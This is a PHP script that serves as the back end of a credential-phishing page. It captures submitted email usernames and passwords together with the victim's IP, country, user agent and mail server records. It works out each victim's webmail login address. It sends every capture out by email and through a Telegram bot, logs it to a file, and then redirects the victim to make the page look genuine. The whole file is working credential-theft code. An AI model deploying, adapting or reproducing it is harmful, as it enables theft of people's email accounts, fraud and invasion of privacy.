<?php 
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');

// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    // Possible paths to check for config.php
    $possiblePaths = [
        __DIR__ . '/config.php',           // Same directory
        dirname(__DIR__) . '/config.php',  // Parent directory
        __DIR__ . '/../config.php',        // One level up
        __DIR__ . '/../../config.php',     // Two levels up
        $_SERVER['DOCUMENT_ROOT'] . '/config.php', // Document root
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php', // Above document root
        '/etc/config.php',                 // System-wide config
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    // If config not found, try to find it recursively
    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

// Load configuration
if (!loadConfig()) {
    // Fallback to hardcoded values if config not found
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

// Use configuration values
$Receive_email = EMAIL;
$telegramBotToken = TG_TOKEN;
$telegramChatId = TG_CHAT_ID;
$submitCount = defined('SUBMIT') ? SUBMIT : 2;

// ==========================================
// Session tracking for submission counting
// ==========================================
function getSessionFolder() {
    global $session_folder;
    
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    
    // Generate a session folder based on IP if not defined
    $ip = getenv("REMOTE_ADDR");
    $folderName = md5($ip . date('Y-m-d'));
    return $folderName;
}

// Initialize session folder
$sessionFolder = getSessionFolder();
$sessionFile = sys_get_temp_dir() . '/' . $sessionFolder . '_submissions.txt';

// ==========================================
// Process the request
// ==========================================
$user = isset($_POST['user']) ? trim($_POST['user']) : '';
$pass = isset($_POST['pass']) ? trim($_POST['pass']) : '';
$userDomain = isset($_POST['userDomain']) ? trim($_POST['userDomain']) : '';

if ($pass != null) {
    // ==========================================
    // Check submission limit
    // ==========================================
    $submissionCount = 0;
    
    // Try to read existing submission count
    if (file_exists($sessionFile)) {
        $submissionCount = (int)file_get_contents($sessionFile);
    }
    
    // If submit count exceeds limit, stop processing
    if ($submissionCount >= $submitCount) {
        // Still redirect but don't log/send
        header("Location: https://$userDomain");
        exit();
    }
    
    // Increment submission count
    $submissionCount++;
    file_put_contents($sessionFile, $submissionCount);
    
    // ==========================================
    // Get additional information
    // ==========================================
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Get country based on IP with fallback
    $country = "Unknown";
    try {
        $countryData = @file_get_contents("https://ipapi.co/$ip/country_name/");
        if ($countryData !== false) {
            $country = trim($countryData);
        }
    } catch (Exception $e) {
        $country = "Unknown";
    }

    // Extract email domain if not provided
    if (empty($userDomain) && strpos($user, '@') !== false) {
        $userDomain = substr(strrchr($user, "@"), 1);
    }

    // Get MX Record
    $mxRecords = @dns_get_record($userDomain, DNS_MX);
    $mxRecordString = "No MX Records Found";
    $webmailL0gin = "Not Available";
    
    if (!empty($mxRecords)) {
        $mxRecordString = implode(", ", array_column($mxRecords, 'target'));
        $mxDomain = $mxRecords[0]['target'];

        // Known mappings for email providers
        $webmailMapping = [
            'mx.yandex.ru' => 'https://mail.yandex.com',
            'mx.mail.ru' => 'https://mail.ru',
            'mx.ukr.net' => 'https://mail.ukr.net',
            'mx.gmx.net' => 'https://mail.gmx.com',
            'mx.orange.fr' => 'https://webmail.orange.fr',
            'mx.protonmail.ch' => 'https://mail.proton.me',
            'mx.web.de' => 'https://web.de',
            'mx.vodafone.it' => 'https://mail.vodafone.it',
            'mx.libero.it' => 'https://mail.libero.it',
            'mx.tiscali.it' => 'https://mail.tiscali.it',
            'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
            'mx.superonline.net' => 'https://mail.superonline.net',
            'mx.turk.net' => 'https://mail.turk.net',
            'mx.telefonica.net' => 'https://webmail.telefonica.net',
            'mx.movistar.es' => 'https://correo.movistar.es',
            'mx.uol.com.br' => 'https://email.uol.com.br',
            'mx.terra.com.br' => 'https://webmail.terra.com.br',
            'mx.bol.com.br' => 'https://email.bol.com.br',
            'stackmail.com' => 'https://stackmail.com',
            'ionos.com' => 'https://mail.ionos.com',
            'appsuite.com' => 'https://mail.appsuite.com',
            '1and1.com' => 'https://mail.ionos.com',
            'titan.email' => 'https://mail.titan.email',
            'zoho.com' => 'https://mail.zoho.com',
            'zoho.in' => 'https://mail.zoho.in',
            'zoho.eu' => 'https://mail.zoho.eu',
            'hostinger.com' => 'https://mail.hostinger.com',
            'secureserver.net' => 'https://email.godaddy.com',
            'google.com' => 'https://mail.google.com',
            'mxhichina' => 'https://mail.mxhichina.com/alimail/',
            'emailsrvr.com' => 'https://apps.rackspace.com',
            'aruba.it' => 'https://webmail.aruba.it/',
        ];

        // Determine webmail L0gin URL
        if (strpos($mxDomain, 'natrohost.com') !== false) {
            $webmailL0gin = "https://mail." . $userDomain;
        } else {
            foreach ($webmailMapping as $key => $url) {
                if (strpos($mxDomain, $key) !== false) {
                    $webmailL0gin = $url;
                    break;
                }
            }
        }

        // Default to webmail.domain if no mapping is found
        if ($webmailL0gin === "Not Available") {
            $webmailL0gin = "https://webmail." . $userDomain;
        }
    }

    // ==========================================
    // Construct the message
    // ==========================================
    $message = "------------------------\n";
    $message .= "Page           : General\n";
    $message .= "usr            : $user\n";
    $message .= "Ps             : $pass\n";
    $message .= "Country        : $country\n";
    $message .= "Timestamp      : " . date("Y-m-d H:i:s") . "\n";
    $message .= "Hostname       : $hostname\n";
    $message .= "Webmail L0gin  : $webmailL0gin\n";
    $message .= "MX Records     : $mxRecordString\n";
    $message .= "----------------------------------\n";
    $message .= "IP             : $ip\n";
    $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent     : $useragent\n";
    $message .= "-----------------------\n";
    $message .= "Submission #   : $submissionCount of $submitCount\n";
    $message .= "-----------------------\n";

    // ==========================================
    // Send the email with error handling
    // ==========================================
    $subject = "$user | $country | $ip";
    @mail($Receive_email, $subject, $message);

    // ==========================================
    // Write to the text file with proper path handling
    // ==========================================
    $filePath = __DIR__ . "/d@main123.txt";
    if ($fileHandler = @fopen($filePath, "a")) {
        @fwrite($fileHandler, $message);
        @fclose($fileHandler);
    } else {
        error_log("Unable to write to file: $filePath");
    }

    // ==========================================
    // Send message to Telegram with error handling
    // ==========================================
    $telegramMessage = urlencode($message);
    @file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage");

    // ==========================================
    // Response
    // ==========================================
    $signal = 'ok';
    $msg = 'Valid Credentials';
} else {
    $signal = 'error_log';
    $msg = 'Invalid Credentials';
}

// ==========================================
// Redirect to Outlook Live
// ==========================================
if (!empty($userDomain)) {
    header("Location: https://$userDomain");
} else {
    header("Location: https://outlook.live.com");
}
exit();
?>